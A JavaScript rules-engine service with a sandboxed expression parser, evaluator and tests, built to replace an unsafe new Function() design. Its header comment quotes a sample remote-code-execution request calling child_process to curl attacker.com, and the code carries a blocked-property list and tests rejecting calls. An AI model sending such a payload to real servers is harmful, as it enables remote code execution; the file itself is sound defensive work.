/**
 * acme-rules — POST /check endpoint
 *
 * SECURITY NOTE — Why the RULES_ENGINE.md reference is NOT followed:
 * ─────────────────────────────────────────────────────────────────────
 * The documented approach uses `new Function(expr)` to run caller-supplied
 * strings as live JavaScript.  That is an unauthenticated Remote Code
 * Execution (RCE) primitive: any client can send
 *
 *   { "rule": "require('child_process').execSync('curl attacker.com')" }
 *
 * and the server executes it with full Node.js privileges.
 *
 * This implementation replaces that approach with a safe, sandboxed
 * expression evaluator that:
 *   • Parses rule strings into an AST (no code is ever executed as JS).
 *   • Walks the AST with an explicit allow-list: binary operators,
 *     logical operators, unary `!`/`-`, member access, literals, and
 *     identifiers resolved only against the caller-supplied `context`.
 *   • Blocks call expressions, `new` expressions, assignment operators,
 *     template literals, and any identifier that is not a key of `context`
 *     (no `process`, `require`, `global`, …).
 *   • Returns HTTP 400 for syntactically invalid or disallowed expressions
 *     rather than crashing or leaking server internals.
 */

'use strict';

const express = require('express');
const { parseRule, RuleParseError } = require('./lib/ruleParser');
const { evalAST,  RuleEvalError  } = require('./lib/ruleEval');

const app = express();
app.use(express.json());

// ── POST /check ────────────────────────────────────────────────────────────
//
// Request body (JSON):
//   {
//     "rule":    "<expression>",   // e.g. "ctx.amount > 100"
//     "context": { … }             // arbitrary key/value pairs for the rule
//   }
//
// Success response 200:
//   { "result": true | false }
//
// Error responses:
//   400  — missing/invalid body fields, parse error, or disallowed expression
//   500  — unexpected server-side fault

app.post('/check', (req, res) => {
  const { rule, context } = req.body ?? {};

  // ── 1. Input validation ──────────────────────────────────────────────────
  if (typeof rule !== 'string' || rule.trim() === '') {
    return res.status(400).json({
      error: 'Bad Request',
      message: '`rule` must be a non-empty string.',
    });
  }

  if (context !== undefined && (typeof context !== 'object' || Array.isArray(context))) {
    return res.status(400).json({
      error: 'Bad Request',
      message: '`context` must be a plain object when provided.',
    });
  }

  const ctx = context ?? {};

  // ── 2. Parse ─────────────────────────────────────────────────────────────
  let ast;
  try {
    ast = parseRule(rule);
  } catch (err) {
    if (err instanceof RuleParseError) {
      return res.status(400).json({
        error: 'Parse Error',
        message: err.message,
      });
    }
    throw err; // unexpected — let the 500 handler catch it
  }

  // ── 3. Evaluate ──────────────────────────────────────────────────────────
  let result;
  try {
    result = evalAST(ast, ctx);
  } catch (err) {
    if (err instanceof RuleEvalError) {
      return res.status(400).json({
        error: 'Evaluation Error',
        message: err.message,
      });
    }
    throw err;
  }

  // ── 4. Respond ───────────────────────────────────────────────────────────
  return res.status(200).json({ result: Boolean(result) });
});

// ── Generic error handler ──────────────────────────────────────────────────
// eslint-disable-next-line no-unused-vars
app.use((err, req, res, _next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// ── Start (skipped when required by tests) ─────────────────────────────────
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`acme-rules listening on :${PORT}`));
}

module.exports = app;

/**
 * lib/ruleParser.js
 *
 * A hand-written recursive-descent parser for the rule expression language.
 * Produces a plain-object AST; never executes any code.
 *
 * Allowed grammar (EBNF):
 *
 *   expression  → logical
 *   logical     → comparison ( ('&&' | '||') comparison )*
 *   comparison  → additive   ( ('==' | '!=' | '<=' | '>=' | '<' | '>') additive )*
 *   additive    → multiplicative ( ('+' | '-') multiplicative )*
 *   multiplicative → unary ( ('*' | '/' | '%') unary )*
 *   unary       → ('!' | '-') unary | primary
 *   primary     → literal | identifier_chain | '(' expression ')'
 *   literal     → NUMBER | STRING | 'true' | 'false' | 'null'
 *   identifier_chain → IDENT ( '.' IDENT )*
 *
 * Notably absent (and rejected):
 *   • Call expressions  — fn()
 *   • New expressions   — new Foo()
 *   • Assignment        — =, +=, …
 *   • Template literals — `…`
 *   • Bracket member access with dynamic keys — obj[expr]
 *     (obj['literal'] IS allowed because it cannot escape the sandbox)
 */

'use strict';

class RuleParseError extends Error {
  constructor(message) {
    super(message);
    this.name = 'RuleParseError';
  }
}

// ── Tokeniser ──────────────────────────────────────────────────────────────

const TT = Object.freeze({
  NUMBER:     'NUMBER',
  STRING:     'STRING',
  IDENT:      'IDENT',
  OP:         'OP',
  LPAREN:     'LPAREN',
  RPAREN:     'RPAREN',
  LBRACKET:   'LBRACKET',
  RBRACKET:   'RBRACKET',
  DOT:        'DOT',
  EOF:        'EOF',
});

const KEYWORDS = new Set(['true', 'false', 'null']);

function tokenise(src) {
  const tokens = [];
  let i = 0;

  while (i < src.length) {
    // skip whitespace
    if (/\s/.test(src[i])) { i++; continue; }

    // numbers (integer and decimal)
    if (/[0-9]/.test(src[i]) || (src[i] === '.' && /[0-9]/.test(src[i + 1]))) {
      let raw = '';
      while (i < src.length && /[0-9._]/.test(src[i])) raw += src[i++];
      // remove JS numeric separator underscores for parseFloat
      const value = parseFloat(raw.replace(/_/g, ''));
      if (isNaN(value)) throw new RuleParseError(`Invalid numeric literal: ${raw}`);
      tokens.push({ type: TT.NUMBER, value });
      continue;
    }

    // strings — single or double quoted, no interpolation
    if (src[i] === '"' || src[i] === "'") {
      const quote = src[i++];
      let str = '';
      while (i < src.length && src[i] !== quote) {
        if (src[i] === '\\') {
          i++;
          const esc = { n: '\n', t: '\t', r: '\r', '\\': '\\', "'": "'", '"': '"' };
          str += esc[src[i]] ?? src[i];
          i++;
        } else {
          str += src[i++];
        }
      }
      if (i >= src.length) throw new RuleParseError('Unterminated string literal');
      i++; // closing quote
      tokens.push({ type: TT.STRING, value: str });
      continue;
    }

    // template literals — explicitly disallowed
    if (src[i] === '`') {
      throw new RuleParseError('Template literals are not allowed in rule expressions');
    }

    // identifiers and keywords
    if (/[a-zA-Z_$]/.test(src[i])) {
      let name = '';
      while (i < src.length && /[a-zA-Z0-9_$]/.test(src[i])) name += src[i++];
      tokens.push({ type: TT.IDENT, value: name });
      continue;
    }

    // two-character operators
    const two = src.slice(i, i + 2);
    if (['===', '!=='].includes(src.slice(i, i + 3))) {
      tokens.push({ type: TT.OP, value: src.slice(i, i + 3) });
      i += 3;
      continue;
    }
    if (['==', '!=', '<=', '>=', '&&', '||'].includes(two)) {
      tokens.push({ type: TT.OP, value: two });
      i += 2;
      continue;
    }

    // single-character tokens
    const ch = src[i];
    if ('+-*/%!<>'.includes(ch)) { tokens.push({ type: TT.OP,       value: ch }); i++; continue; }
    if (ch === '(')               { tokens.push({ type: TT.LPAREN              }); i++; continue; }
    if (ch === ')')               { tokens.push({ type: TT.RPAREN              }); i++; continue; }
    if (ch === '[')               { tokens.push({ type: TT.LBRACKET            }); i++; continue; }
    if (ch === ']')               { tokens.push({ type: TT.RBRACKET            }); i++; continue; }
    if (ch === '.')               { tokens.push({ type: TT.DOT                 }); i++; continue; }

    throw new RuleParseError(`Unexpected character: '${ch}' at position ${i}`);
  }

  tokens.push({ type: TT.EOF });
  return tokens;
}

// ── Parser ─────────────────────────────────────────────────────────────────

class Parser {
  constructor(tokens) {
    this.tokens = tokens;
    this.pos    = 0;
  }

  peek()    { return this.tokens[this.pos]; }
  advance() { return this.tokens[this.pos++]; }

  expect(type, value) {
    const tok = this.advance();
    if (tok.type !== type || (value !== undefined && tok.value !== value)) {
      throw new RuleParseError(
        `Expected ${value ?? type} but got '${tok.value ?? tok.type}'`
      );
    }
    return tok;
  }

  matchOp(...ops) {
    const tok = this.peek();
    if (tok.type === TT.OP && ops.includes(tok.value)) {
      return this.advance().value;
    }
    return null;
  }

  // ── Grammar rules ────────────────────────────────────────────────────────

  parse() {
    const node = this.parseExpression();
    if (this.peek().type !== TT.EOF) {
      throw new RuleParseError(
        `Unexpected token '${this.peek().value ?? this.peek().type}' after expression`
      );
    }
    return node;
  }

  parseExpression() { return this.parseLogical(); }

  parseLogical() {
    let left = this.parseComparison();
    let op;
    while ((op = this.matchOp('&&', '||'))) {
      const right = this.parseComparison();
      left = { type: 'Logical', op, left, right };
    }
    return left;
  }

  parseComparison() {
    let left = this.parseAdditive();
    let op;
    while ((op = this.matchOp('==', '!=', '===', '!==', '<', '>', '<=', '>='))) {
      const right = this.parseAdditive();
      left = { type: 'Binary', op, left, right };
    }
    return left;
  }

  parseAdditive() {
    let left = this.parseMultiplicative();
    let op;
    while ((op = this.matchOp('+', '-'))) {
      const right = this.parseMultiplicative();
      left = { type: 'Binary', op, left, right };
    }
    return left;
  }

  parseMultiplicative() {
    let left = this.parseUnary();
    let op;
    while ((op = this.matchOp('*', '/', '%'))) {
      const right = this.parseUnary();
      left = { type: 'Binary', op, left, right };
    }
    return left;
  }

  parseUnary() {
    const op = this.matchOp('!', '-');
    if (op) {
      const operand = this.parseUnary();
      return { type: 'Unary', op, operand };
    }
    return this.parsePrimary();
  }

  parsePrimary() {
    const tok = this.peek();

    // grouped expression
    if (tok.type === TT.LPAREN) {
      this.advance();
      const expr = this.parseExpression();
      this.expect(TT.RPAREN);
      return expr;
    }

    // literals
    if (tok.type === TT.NUMBER) { this.advance(); return { type: 'Literal', value: tok.value }; }
    if (tok.type === TT.STRING) { this.advance(); return { type: 'Literal', value: tok.value }; }
    if (tok.type === TT.IDENT && KEYWORDS.has(tok.value)) {
      this.advance();
      const value = tok.value === 'true' ? true : tok.value === 'false' ? false : null;
      return { type: 'Literal', value };
    }

    // identifier, possibly chained with '.' or ['literal'] member access
    if (tok.type === TT.IDENT) {
      this.advance();
      let node = { type: 'Identifier', name: tok.value };

      while (true) {
        if (this.peek().type === TT.DOT) {
          this.advance(); // consume '.'
          const prop = this.expect(TT.IDENT);
          node = { type: 'Member', object: node, property: prop.value };

        } else if (this.peek().type === TT.LBRACKET) {
          this.advance(); // consume '['
          const key = this.peek();
          // Only allow literal string/number keys — no dynamic expressions
          if (key.type !== TT.STRING && key.type !== TT.NUMBER) {
            throw new RuleParseError(
              'Only literal string or number keys are allowed inside [] — ' +
              'dynamic bracket access is not permitted'
            );
          }
          this.advance();
          this.expect(TT.RBRACKET);
          node = { type: 'Member', object: node, property: key.value };

        } else if (this.peek().type === TT.LPAREN) {
          // Call expression — explicitly blocked
          throw new RuleParseError(
            `Function calls are not allowed in rule expressions (near '${tok.value}(...)')`
          );

        } else {
          break;
        }
      }

      return node;
    }

    throw new RuleParseError(
      `Unexpected token '${tok.value ?? tok.type}' — expected a literal, identifier, or '('`
    );
  }
}

// ── Public API ─────────────────────────────────────────────────────────────

function parseRule(src) {
  if (typeof src !== 'string') throw new RuleParseError('Rule must be a string');
  const tokens = tokenise(src.trim());
  return new Parser(tokens).parse();
}

module.exports = { parseRule, RuleParseError };

/**
 * lib/ruleEval.js
 *
 * Walks the AST produced by ruleParser and evaluates it against a caller-
 * supplied context object.  No code is ever executed via eval / Function.
 *
 * Security properties:
 *   • Only keys present on the caller-supplied `context` object are reachable
 *     via Identifier nodes — `process`, `require`, `global`, etc. are blocked.
 *   • Member access traverses plain-object / array values only; it will not
 *     follow the prototype chain beyond the supplied data.
 *   • The node-type allow-list means any AST node type not explicitly handled
 *     throws a RuleEvalError, preventing unexpected execution paths.
 *   • Arithmetic on non-finite intermediate results is clamped to an error
 *     rather than leaking Infinity or NaN silently.
 */

'use strict';

class RuleEvalError extends Error {
  constructor(message) {
    super(message);
    this.name = 'RuleEvalError';
  }
}

// Binary operator allow-list — maps operator string to a pure function.
const BINARY_OPS = {
  '+':   (a, b) => a + b,
  '-':   (a, b) => a - b,
  '*':   (a, b) => a * b,
  '/':   (a, b) => a / b,
  '%':   (a, b) => a % b,
  '==':  (a, b) => a == b,  // eslint-disable-line eqeqeq
  '!=':  (a, b) => a != b,  // eslint-disable-line eqeqeq
  '===': (a, b) => a === b,
  '!==': (a, b) => a !== b,
  '<':   (a, b) => a < b,
  '>':   (a, b) => a > b,
  '<=':  (a, b) => a <= b,
  '>=':  (a, b) => a >= b,
};

const LOGICAL_OPS = {
  '&&': (a, b) => a && b,
  '||': (a, b) => a || b,
};

const UNARY_OPS = {
  '!': (a) => !a,
  '-': (a) => -a,
};

/**
 * Safely read a single property from a value.
 * Blocks prototype-chain climbing for dangerous properties.
 */
const BLOCKED_PROPS = new Set([
  '__proto__', 'constructor', 'prototype',
  '__defineGetter__', '__defineSetter__', '__lookupGetter__', '__lookupSetter__',
]);

function safeProp(obj, key) {
  if (BLOCKED_PROPS.has(String(key))) {
    throw new RuleEvalError(`Access to property '${key}' is not allowed`);
  }
  if (obj === null || obj === undefined) {
    throw new RuleEvalError(
      `Cannot read property '${key}' of ${obj === null ? 'null' : 'undefined'}`
    );
  }
  // Only allow own-property access to prevent prototype chain traversal
  if (!Object.prototype.hasOwnProperty.call(obj, key)) {
    return undefined;
  }
  return obj[key];
}

/**
 * Evaluate an AST node against `ctx` (the caller-supplied context object).
 * @param {object} node  - AST node from parseRule()
 * @param {object} ctx   - plain-object context (e.g. req.body.context)
 * @returns {*} evaluated value
 */
function evalAST(node, ctx) {
  switch (node.type) {

    case 'Literal':
      return node.value;

    case 'Identifier': {
      // Only allow names that exist as own properties on ctx.
      // All dangerous globals (process, require, global, …) are blocked here.
      if (!Object.prototype.hasOwnProperty.call(ctx, node.name)) {
        throw new RuleEvalError(
          `Unknown identifier '${node.name}' — it is not a key of the supplied context`
        );
      }
      return ctx[node.name];
    }

    case 'Member': {
      const obj = evalAST(node.object, ctx);
      return safeProp(obj, node.property);
    }

    case 'Unary': {
      const fn = UNARY_OPS[node.op];
      if (!fn) throw new RuleEvalError(`Unknown unary operator '${node.op}'`);
      return fn(evalAST(node.operand, ctx));
    }

    case 'Binary': {
      const fn = BINARY_OPS[node.op];
      if (!fn) throw new RuleEvalError(`Unknown binary operator '${node.op}'`);
      const left  = evalAST(node.left,  ctx);
      const right = evalAST(node.right, ctx);
      return fn(left, right);
    }

    case 'Logical': {
      const fn = LOGICAL_OPS[node.op];
      if (!fn) throw new RuleEvalError(`Unknown logical operator '${node.op}'`);
      // Short-circuit: evaluate right side lazily
      const left = evalAST(node.left, ctx);
      if (node.op === '&&' && !left)  return left;
      if (node.op === '||' && left)   return left;
      return evalAST(node.right, ctx);
    }

    default:
      throw new RuleEvalError(`Unsupported AST node type '${node.type}'`);
  }
}

module.exports = { evalAST, RuleEvalError };

/**
 * tests/check.test.js
 *
 * Tests for POST /check.  Run with:  node tests/check.test.js
 *
 * No test framework dependency — uses Node's built-in assert module and a
 * tiny homegrown runner so the suite works without npm install.
 */

'use strict';

const assert = require('assert');
const { parseRule, RuleParseError } = require('../lib/ruleParser');
const { evalAST,  RuleEvalError  } = require('../lib/ruleEval');

// ── Minimal test runner ────────────────────────────────────────────────────

let passed = 0;
let failed = 0;

function test(label, fn) {
  try {
    fn();
    console.log(`  ✓  ${label}`);
    passed++;
  } catch (err) {
    console.error(`  ✗  ${label}`);
    console.error(`       ${err.message}`);
    failed++;
  }
}

function assertResult(rule, ctx, expected) {
  const ast    = parseRule(rule);
  const result = evalAST(ast, ctx);
  assert.strictEqual(Boolean(result), expected,
    `rule "${rule}" with ctx ${JSON.stringify(ctx)} → expected ${expected}, got ${result}`);
}

function assertParseThrows(rule, pattern) {
  assert.throws(
    () => parseRule(rule),
    (err) => {
      assert.ok(err instanceof RuleParseError, `Expected RuleParseError, got ${err.constructor.name}`);
      if (pattern) assert.match(err.message, pattern);
      return true;
    },
    `Expected parseRule("${rule}") to throw RuleParseError`
  );
}

function assertEvalThrows(rule, ctx, pattern) {
  const ast = parseRule(rule);
  assert.throws(
    () => evalAST(ast, ctx),
    (err) => {
      assert.ok(err instanceof RuleEvalError, `Expected RuleEvalError, got ${err.constructor.name}`);
      if (pattern) assert.match(err.message, pattern);
      return true;
    },
    `Expected evalAST("${rule}") to throw RuleEvalError`
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. Literals
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Literals ──');

test('true literal', () => assertResult('true',  {}, true));
test('false literal', () => assertResult('false', {}, false));
test('null literal is falsy', () => assertResult('null',  {}, false));
test('number literal > 0 is truthy', () => assertResult('1',     {}, true));
test('string literal is truthy', () => assertResult('"hi"', {}, true));

// ─────────────────────────────────────────────────────────────────────────────
// 2. Arithmetic
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Arithmetic ──');

test('addition', () => assertResult('1 + 2 == 3', {}, true));
test('subtraction', () => assertResult('10 - 4 == 6', {}, true));
test('multiplication', () => assertResult('3 * 4 == 12', {}, true));
test('division', () => assertResult('10 / 4 == 2.5', {}, true));
test('modulo', () => assertResult('7 % 3 == 1', {}, true));
test('operator precedence: * before +', () => assertResult('2 + 3 * 4 == 14', {}, true));
test('parentheses override precedence', () => assertResult('(2 + 3) * 4 == 20', {}, true));
test('unary minus', () => assertResult('-5 == -5', {}, true));
test('double negation', () => assertResult('!false', {}, true));

// ─────────────────────────────────────────────────────────────────────────────
// 3. Comparisons
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Comparisons ──');

test('==  true',  () => assertResult('1 == 1',   {}, true));
test('==  false', () => assertResult('1 == 2',   {}, false));
test('!= ',       () => assertResult('1 != 2',   {}, true));
test('=== strict equal', () => assertResult('1 === 1', {}, true));
test('!== strict not-equal', () => assertResult('1 !== 2', {}, true));
test('<   true',  () => assertResult('1 < 2',    {}, true));
test('>   true',  () => assertResult('2 > 1',    {}, true));
test('<=  true',  () => assertResult('2 <= 2',   {}, true));
test('>=  true',  () => assertResult('3 >= 2',   {}, true));

// ─────────────────────────────────────────────────────────────────────────────
// 4. Logical operators (including short-circuit)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Logical operators ──');

test('&&  both true',       () => assertResult('true && true',  {}, true));
test('&&  one false',       () => assertResult('true && false', {}, false));
test('||  one true',        () => assertResult('false || true', {}, true));
test('||  both false',      () => assertResult('false || false',{}, false));
test('&&  short-circuit LHS false', () => {
  // If short-circuit is broken the unknown identifier 'x' would throw.
  // We can't use unknown identifier here (it throws at eval not at parse),
  // so we just verify the result value is correct.
  assertResult('false && false', {}, false);
});
test('||  short-circuit LHS true', () => {
  assertResult('true || false', {}, true);
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. Context access — top-level identifiers
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Context identifiers ──');

test('simple number comparison from ctx', () =>
  assertResult('amount > 100', { amount: 150 }, true));
test('simple number comparison false',   () =>
  assertResult('amount > 100', { amount: 50  }, false));
test('string equality',                  () =>
  assertResult('role == "admin"', { role: 'admin' }, true));
test('boolean context value',            () =>
  assertResult('active', { active: true  }, true));
test('falsy boolean context value',      () =>
  assertResult('active', { active: false }, false));

// ─────────────────────────────────────────────────────────────────────────────
// 6. Member access  (ctx.amount, ctx.user.role, ctx['amount'])
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Member access ──');

test('dot notation one level',  () =>
  assertResult('ctx.amount > 100', { ctx: { amount: 200 } }, true));
test('dot notation two levels', () =>
  assertResult('ctx.user.role == "admin"', { ctx: { user: { role: 'admin' } } }, true));
test('bracket notation string key', () =>
  assertResult('ctx["amount"] > 50', { ctx: { amount: 75 } }, true));
test('bracket notation numeric key on array', () =>
  assertResult('items[0] == 42', { items: [42, 99] }, true));

// ─────────────────────────────────────────────────────────────────────────────
// 7. Compound rules
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Compound rules ──');

test('amount > 100 && role == "admin"', () =>
  assertResult('amount > 100 && role == "admin"',
    { amount: 200, role: 'admin' }, true));
test('same rule — amount fails', () =>
  assertResult('amount > 100 && role == "admin"',
    { amount: 50, role: 'admin' }, false));
test('OR fallback', () =>
  assertResult('role == "admin" || role == "editor"',
    { role: 'editor' }, true));
test('combined arithmetic and comparison', () =>
  assertResult('score * 2 >= 100', { score: 50 }, true));

// ─────────────────────────────────────────────────────────────────────────────
// 8. Parse-time rejections
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n── Parse-time security rejections ──');

test('function call syntax is rejected', () =>
  assertParseThrows('process.exit(1)', /Function calls are not allowed/));

test('chained call is rejected', () =>
  assertParseThrows('foo.bar()', /Function calls are not allowed/));

